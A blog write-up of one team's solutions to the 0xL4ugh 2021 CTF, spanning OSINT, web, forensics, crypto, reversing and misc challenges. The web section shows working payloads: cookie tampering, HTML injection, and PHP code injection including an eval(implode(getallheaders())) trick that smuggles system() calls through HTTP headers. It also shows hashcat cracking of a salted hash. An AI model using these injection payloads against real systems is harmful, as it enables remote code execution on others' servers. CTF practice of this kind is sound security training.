---
title: "CTF - 0xL4ugh 2021"
categories: [ctf]
date: 2021-01-16
comments: true
image: /images/writeups/0xL4ugh/logo.png
description: CTF - 0xL4ugh 2021
---

# 0xL4ugh 2021

<p align="center">
  <img src="/images/writeups/0xL4ugh/logo.png" width="50%"/>
</p>

I participate in this CTF for team [ISwearIGoogledIt](https://ctftime.org/team/109689) and got some challenges!

<p align="center">
  <img src="/images/writeups/0xL4ugh/rank.png" width="75%"/>
</p>

### OSINT

- [Message From Boss](#message-from-boss)

### Web

- [Cakes Shop](#cakes-shop)
- [EasyLogin](#easylogin)
- [Sad_Agent](#sad_agent)
- [Embedding](#embedding)

### Forensic

- [Baby Shark](#baby-shark)

### Crypto

- [Me & You!](#me--you)
- [Raheem Sterling Ahmed](#raheem-sterling-ahmed)
- [Cyclops](#cyclops)

### Reverse

- [Home](#home)
- [WannaCry](#wannacry)

### Programming

- [Hashem](#hashem)

### Misc

- [Noisy](#noisy)
- [Gesture](#gesture)
- [1990](#1990)


---

# OSINT 

##  Message From Boss
150

My Boss Told Me That He will send me a message by an account that follow this twitter user (0xL4ugh) but i can’t Find It can you give it to me

I started checking it's followers until I found this one [CanuSeeMe](https://twitter.com/SeeCanu). In his twitter there is a [tweet](https://twitter.com/SeeCanu/status/1349726515945107465) to a [pastebin](https://pastebin.com/hQrzTrMg) with a password.

<p align="center">
  <img src="/images/writeups/0xL4ugh/OSINT/1_acc.png" width="500"/>
</p>

<p align="center">
  <img src="/images/writeups/0xL4ugh/OSINT/1_paste.png" width="500"/>
</p>

I tried many simple combinations with its name, looked over other social media until I checked on [waybackmachine](https://web.archive.org), first on his twitter account and then on the pastebin and there it [was](https://web.archive.org/web/20210114142519/https://pastebin.com/hQrzTrMg):

<p align="center">
  <img src="/images/writeups/0xL4ugh/OSINT/1_flag.png" width="70%"/>
</p>

``` 0xL4ugh{S1MPl3_OsINt_Chall3nge} ```


---

# Web

## Cakes Shop
100

Welcome To My Cakes Shop Can you Buy The Flag Cake To Me ? :)

http://168.61.100.233/Cakes/

We can see this web. A challenge called cake shop... Maybe it's something related with the cookies. In there, we can find a cookie with a certain value. If we take out that value and reload the website, our balance dissapears, so that value is related with the number 50000:

<p align="center">
  <img src="/images/writeups/0xL4ugh/Web/1_web.png" width="80%"/>
</p>

If we decode _GUYDAMBQ_ with base32, we find the value 50000, so we will encode the number 1000000000 into base32 and place it on the cookie:

``` GEYDAMBQGAYDAMBQGAYA==== ```

<p align="center">
  <img src="/images/writeups/0xL4ugh/Web/1_balance.png" width="80%"/>
</p>

Reload the website and we found the flag by buying the flag:

<p align="center">
  <img src="/images/writeups/0xL4ugh/Web/1_flag.png" width="80%"/>
</p>

``` 0xL4ugh{baSe_32_Cook!es_ArE_FuNny} ```


##  EasyLogin
150

The Exploitation Is Easy But The Development Is Hard !! link : http://20.36.44.185/ Author : CyberGuy

We got a website. In the comments it said that we can use admin:admin to enter the blog:

<p align="center">
  <img src="/images/writeups/0xL4ugh/Web/2_web.png" width="500"/>
</p>

Enter the site:

<p align="center">
  <img src="/images/writeups/0xL4ugh/Web/2_in.png" width="80%"/>
</p>

I checked if there is any XSS but I get 403 forbidden, so I went over burp to make some tests. Suddenly I found a hint:

```
Hint: Inject An HTML Tag And Give Him The ID flagHunt
```
<p align="center">
  <img src="/images/writeups/0xL4ugh/Web/2_hint.png" width="500"/>
</p>

So I tried the injection using this payload in the text:

```
name=Kash&title=A+test&mail=thisis%40email.com&gander=male&blogBody=<p id='flagHunt'>Sup</p>
```

So the hint was correct and I got this:

<p align="center">
  <img src="/images/writeups/0xL4ugh/Web/2_pre.png" width="80%"/>
</p>

<p align="center">
  <img src="/images/writeups/0xL4ugh/Web/2_flag.png" width="80%"/>
</p>


``` 0xL4ugh{N0_Syst3m_1s_S@f3_3v3n_Y0u} ```


##  Sad_Agent
200

do you know ... i have secret organization called sad can't anyone access it by any browser and you should be sad to access and decode anything in your bad life link : http://168.61.3.216/sad_agent/ author : Sad Coder

I use the extension User-Agent in firefox and set the user agent to different things: 

``` 
:(, sad_agent, Sad-Agent...
```

The easy way is _sad_ as user-agent, then we get this:

<p align="center">
  <img src="/images/writeups/0xL4ugh/Web/3_saduser.png" width="500"/>
</p>

<p align="center">
  <img src="/images/writeups/0xL4ugh/Web/3_sad.png" width="80%"/>
</p>

That thing about the sad user-agent didn't take me too far. So I started looking into the code and how we can exploit the server query they are using to get the user-agent. We can see at the form a parameter called url and a fixed value which in base64 is _echo $_SERVER['HTTP_USER_AGENT'];_ so we can try to pull all the content from the file with the following payload:

<p align="center">
  <img src="/images/writeups/0xL4ugh/Web/3_form.png" width="80%"/>
</p>

``` echo shell_exec('cat index.php'); -> ZWNobyBzaGVsbF9leGVjKCdjYXQgaW5kZXgucGhwJyk7Cg== ```

Substitute it on the form, send the form and the flag will appear as it was part of the php file:

<p align="center">
  <img src="/images/writeups/0xL4ugh/Web/3_flag.png" width="80%"/>
</p>

``` 0xL4ugh{S@dC0d3r_M3mbe3r_1n_0xL4ugh_&_sad_W0rld} ```


##  Embedding
250

Some one Reports That We Use Function Could Lead to Evil Things But Our Devpoloper Say That He Make a Secure System Can You Prove to us Who Of Them Is Correct ! Link : http://138.91.58.10/Embedding/ Author : abdoghazy

http://138.91.58.10/Embedding/?username=shell_exec%28%27ls%27%29

<p align="center">
  <img src="/images/writeups/0xL4ugh/Web/4_shell.png" width="70%"/>
</p>

We have 40 chars limit. Some of the failed tries were:

```
http://138.91.58.10/Embedding/?username=

shell_exec('cat fl@g.php')

readfile(next(next(scandir(__DIR__))))

readfile(index.php)

```

By reading the index we got how out payload is being read:

```
40) { die("Bad Character Detected or you Break The Limit "); } $username=$_GET['username']; $eval=eval("echo ".$username.";"); echo(" welcome ".$eval); } ?> 656 welcome 
```

Since the input characters are limited to **[0-9a-zA-Z()_]** we are going to try other attack using PHP inbuilt funcions to insert content from an uncontroled source, like the HTTP headers. In this attack we use the following payload:

eval(implode(getallheaders()))

With those functions, first, we retrieve the HTTP Headers. The response from _getallheaders()_ came into a dictionary, so we can use the function _implode()_ to return a string from the dictionary. If we set a proper payload on the HTTP headers, we can then use it to evaluate it:

- HTTP headers:

```
xyz: /*test
Host: 138.91.58.10
User-Agent: */ eval(system('cat fl@g.php'));/*
Accept: text/html,application/xhtml+xml,application/xml;
Others: ...
abc: test*/
```

- getallheaders()

{% highlight json %}
["/*test", "138.91.58.10", 
"*/ eval(system('cat fl@g.php'));/*", 
"...", "test*/"]
{% endhighlight %}

- implode()

```
/*test138.91.58.10*/ eval(system('cat fl@g.php'));/*...test*/
```

With that payload, all the commented text won't be evaluated and the cat will be execute correctly:

<p align="center">
  <img src="/images/writeups/0xL4ugh/Web/4_flag.png" width="80%"/>
</p>

``` 0xL4ugh{Z!90o_S@y_W3lC0m3} ```

---

# Forensic

##  Baby Shark
100

A beginner hacker came into my network and hide something can u find out what did he hide ?

link : https://www.mediafire.com/file/dxlmjm97quvjh7y/BabyShark.zip/file

Authors : xElessaway & MM0X

We get a pcap file. In it we can see a login.php request with some information within. Seems like encoded, so let's decode it:

<p align="center">
  <img src="/images/writeups/0xL4ugh/Forensic/1_info.png" width="500"/>
</p>

```
email=flag%400xl4ugh.com&password=3Cd7MMS7GmZMwxmRTfQwoXvxcDkGt8o4cFzwPUrg
```

The password seems to be encoded on base58 as the Magic operation suggests on CyberChef:

<p align="center">
  <img src="/images/writeups/0xL4ugh/Forensic/1_magic.png" width="80%"/>
</p>

```
3Cd7MMS7GmZMwxmRTfQwoXvxcDkGt8o4cFzwPUrg
base58
0xL4ugh{W1R3SH4ARK_I5_N0I53Y}
```

``` 0xL4ugh{W1R3SH4ARK_I5_N0I53Y} ```

---

# Crypto

##  Me & You!
100

i tried to send you a messege from my laptop but i think something went wrong so can u help me to find out what is this ??

Flag Format : 0xL4ugh{TheMessage}

Authors : xElessaway & MM0X

We have the following text:

```
{ ^),!&),!!$,^$,!^%,!$&,!%),!&#,!!#,^#,!&!,!$@,^),!$!,!^@,!$$,!#&,^!,!^#,!#&,!!),^#,!!$,!@),!)^,!@%,^!,^!,!&% }
```

Ummmm.... Seems like they are using some codification in ascii numbers since there are 2 and 3 chars long items. This chall is hard for people with different keyboard layout, however I use the ANSI layout and I could reach the conclusion that each symbol is in a number key so I translate it by introducing the numbers according to the symbols. 

<p align="center">
  <img src="/images/writeups/0xL4ugh/Crypto/key.jpeg" width="700"/>
</p>

Then I've got this:

```
60 170 114 64 165 147 150 173 113 63 171 142 60 141 162 144 137 61 163 137 110 63 114 120 106 125 61 61 175

60,170,114,64,165,147,150,173,113,63,171,142,60,141,162,144,137,61,163,137,110,63,114,120,106,125,61,61,175
```

But they aren't decimal ascii, looking to the ascci table we can see that 175 is the '}' symbol in octal, so those number are octal. I have prepared a script to retrieve the flag:

{% highlight python %}

oct_list = [60,170,114,64,165,147,150,173,113,63,171,142,60,141,162,144,137,61,163,137,110,63,114,120,106,125,61,61,175]
dec_list = []

for n in oct_list:
  dec_list.append(chr(int(str(n), 8)))

print(''.join(dec_list))

{% endhighlight %}

``` 0xL4ugh{K3yb0ard_1s_H3LPFU11} ```


##  Raheem Sterling Ahmed
100

Can you help Raheem Sterling Ahmed understand this secret Liverpool message?

Author : Mina

Seems like babyRSA:

```
python3 RsaCtfTool.py --createpub -n 5028492424316659784848610571868499830635784588253436599431884204425304126574506051458282629520844349077718907065343861952658055912723193332988900049704385076586516440137002407618568563003151764276775720948938528351773075093802636408325577864234115127871390168096496816499360494036227508350983216047669122408034583867561383118909895952974973292619495653073541886055538702432092425858482003930575665792421982301721054750712657799039327522613062264704797422340254020326514065801221180376851065029216809710795296030568379075073865984532498070572310229403940699763425130520414160563102491810814915288755251220179858773367510455580835421154668619370583787024315600566549750956030977653030065606416521363336014610142446739352985652335981500656145027999377047563266566792989553932335258615049158885853966867137798471757467768769820421797075336546511982769835420524203920252434351263053140580327108189404503020910499228438500946012560331269890809392427093030932508389051070445428793625564099729529982492671019322403728879286539821165627370580739998221464217677185178817064155665872550466352067822943073454133105879256544996546945106521271564937390984619840428052621074566596529317714264401833493628083147272364024196348602285804117877 -e 65537 > ~/Desktop/CTFs/0xL4ugh/Crypto/key.pub

python3 RsaCtfTool.py --publickey ~/Desktop/CTFs/0xL4ugh/Crypto/key.pub --private > ~/Desktop/CTFs/0xL4ugh/Crypto/key

```

This time RsaCtfTool didn't worked for me. I start thinking about doing it myself using [factordb]() and it worked, seems to be a multi-prime RSA, so I craft the following code and call factordb from it to then obtain the flag:

{% highlight python %}
from factordb.factordb import FactorDB
from Crypto.Util.number import inverse
import binascii

def check_factordb(N):
    factorized = FactorDB(N)
    factorized.connect()
    factor_list = factorized.get_factor_list()
    print(factor_list)
    return factor_list

n = 5028492424316659784848610571868499830635784588253436599431884204425304126574506051458282629520844349077718907065343861952658055912723193332988900049704385076586516440137002407618568563003151764276775720948938528351773075093802636408325577864234115127871390168096496816499360494036227508350983216047669122408034583867561383118909895952974973292619495653073541886055538702432092425858482003930575665792421982301721054750712657799039327522613062264704797422340254020326514065801221180376851065029216809710795296030568379075073865984532498070572310229403940699763425130520414160563102491810814915288755251220179858773367510455580835421154668619370583787024315600566549750956030977653030065606416521363336014610142446739352985652335981500656145027999377047563266566792989553932335258615049158885853966867137798471757467768769820421797075336546511982769835420524203920252434351263053140580327108189404503020910499228438500946012560331269890809392427093030932508389051070445428793625564099729529982492671019322403728879286539821165627370580739998221464217677185178817064155665872550466352067822943073454133105879256544996546945106521271564937390984619840428052621074566596529317714264401833493628083147272364024196348602285804117877
c = 4690057718147075505522680135959473215321622692923721213835300886402444910436674094980456964526719786485709929645871497583481786451712108343985733309427211434750949557522557087475715799166136616546091244246093209194216096205011115055709130990240778725741521267153888212132276867942685123502211572949952162376597662509054070693025973089923370015547373862589488928782901235791144433788299046705518327561160954291094820233386528023713184029738780555483600166071578613803010858511582163397706626459433456365568227181855121476317779040965290548179086133039864725660837003894485377993939038122515590380127757353399577646033195886942935498851291625325622687406058565345707842924577200871090281931390828399034387159796711570518912284855782049322766568438776035673997640836043767460584670094065481165095303859142188605921710309909549354356478577687136627040919972987279885429990570784611705563443122226291405511409355924588407638851356402686178076614729462505897314633054448103933929160379080620408454649164684464952565103672481604538187885457480005006907884784443460386864548916037417492123123957243478299871616131317172973941585334012558762947082226744473068190488648000780008598569174088053018903156614111943478152720349210983651343
e = 65537

primes = check_factordb(n)

ts, xs, ds = [], [], []

for i in primes:
  ds.append(inverse(e, i-1))

m = primes[0]

for i in range(1, len(primes)):
  ts.append(inverse(m, primes[i]))
  m = m * primes[i]

for i in range(len(primes)):
  xs.append(pow((c%primes[i]), ds[i], primes[i]))

x = xs[0]
m = primes[0]

for i in range(1, len(primes)):
  x = x + m * ((xs[i] - x % primes[i]) * (ts[i-1] % primes[i]))
  m = m * primes[i]

print hex(x%n)[2:-1].decode("hex")

{% endhighlight %}

``` 0xL4ugh{Multi_prime_RSA_is_normal_RSA_but_on_steroids} ```


##  Cyclops
100

Cyclops sent this messege can u read it ??

Link: https://www.mediafire.com/file/yz5a0cecs9kmvwn/Cyclops.zip/file

We got an image:

<p align="center">
  <img src="/images/writeups/0xL4ugh/Crypto/B.png" width="500"/>
</p>

That is braille, I used [dcode](https://www.dcode.fr/braille-alphabet) to decode it:

``` 0xL4ugh{I_Th1nk_Br1ll3_W45_$m4rt} ```

---

# Reverse

## Home
100

Soo Easy

author: skynet

With strings command we get the flag:

``` 0xL4ugh{34SY_R3V_Ch411} ```

##  WannaCry
100

html author : Skynet

We use again strings, now with rabin2:

```
rabin2 -zz chall.out 
14  0x00002008 0x0804a008 63  64   .rodata   ascii   0xL4ugh&amp;&num;123&semi;Ourfirsteventenjoy&amp;&num;125&semi;
```
If we decode those HTML chars, we get the flag:

``` 0xL4ugh{Ourfirsteventenjoy} ```

---

# Programming

## Hashem
100

Hashem has a salted hash of his password that he has forgotten. Lucky for us that he is sure that his password had only lower case characters and its was shorter than 6 characters. Can you help him find his password?

the Salt is: "mmal7"

here is the salted Hash: "bd737ce0d884c0dd54adf35fdb794b60"

    P.S: there are two possible locations for the salt either before the password or after the password. If the salt was before the password, then the flag would be 0xL4ugh{1_password} and if the salt was after the password then the flag would be 0xL4ugh{2_password}

Author : Mina

I used hashcat with the md5($hash.$salt) config and the mask of 5 lower case letter:

```
$ hashcat -a 3 -m 10 chall.hash ?l?l?l?l?l -O --show
bd737ce0d884c0dd54adf35fdb794b60:mmal7:laugh
```

``` 0xL4ugh{2_laugh} ```


---

# Misc

##  Noisy
100

s0 noisy. link :https://www.mediafire.com/file/dzizhmbl3j11kfj/Noisy.zip/file Authors : xElessaway & MM0x

We got a wav file with extrange noises. Let's check it's spectrogram:

<p align="center">
  <img src="/images/writeups/0xL4ugh/Misc/2_noise.png" width="500"/>
</p>

``` 0xL4ugh{Sp3c7r0_1s_Gr347} ```


##  Gesture
100

I lost my lock screen password can u get it?

Authors : xElessaway & MM0X https://www.mediafire.com/file/t1se4lmnlfjreud/gesture.zip/file

Flag Format: 0xL4ugh{TheFileKey} (No Spaces )

I check on google about the gesture-key file and seems to be the one with the mobile phone pin. We can use [this cracker] to obtain the key:

```
kali@kali:/opt/GestureCrack$ python2 gesturecrack.py -f ../../home/kali/Desktop/CTFs/0xL4ugh/Misc/gesture.key 
   

        The Lock Pattern code is [7, 5, 2, 1, 4, 8, 6, 3]

        For reference here is the grid (starting at 0 in the top left corner):

        |0|1|2|
        |3|4|5|
        |6|7|8|

```

[7, 5, 2, 1, 4, 8, 6, 3]

``` 0xL4ugh{75214863} ```


## 1990
100

I got this Massege from The past But i couldn't understand it can you?! link : https://www.mediafire.com/file/7bhfs2abkidv7sf/1990.zip/file

Flag Format : 0xL4ugh{TheMassege}


It sounds like DTMF. For this task I use multimon-ng:

```
kali@kali:~/Desktop/CTFs/0xL4ugh/Misc$ multimon-ng -t wav -a DTMF 1990.wav 
multimon-ng 1.1.8
  (C) 1996/1997 by Tom Sailer HB9JNX/AE4WA
  (C) 2012-2019 by Elias Oenal
Available demodulators: POCSAG512 POCSAG1200 POCSAG2400 FLEX EAS UFSK1200 CLIPFSK FMSFSK AFSK1200 AFSK2400 AFSK2400_2 AFSK2400_3 HAPN4800 FSK9600 DTMF ZVEI1 ZVEI2 ZVEI3 DZVEI PZVEI EEA EIA CCIR MORSE_CW DUMPCSV X10 SCOPE
Enabled demodulators: DTMF

66#666#8#33#888#33#777#999#8#44#444#66#4#666#66#7777#2#6#33#9#2#999#
```

We can use the photo of a dialpad to decode it:

NOTEVERYTHINGONSAMEWAY

``` 0xL4ugh{NOTEVERYTHINGONSAMEWAY} ```

That's all! Thanks for reading!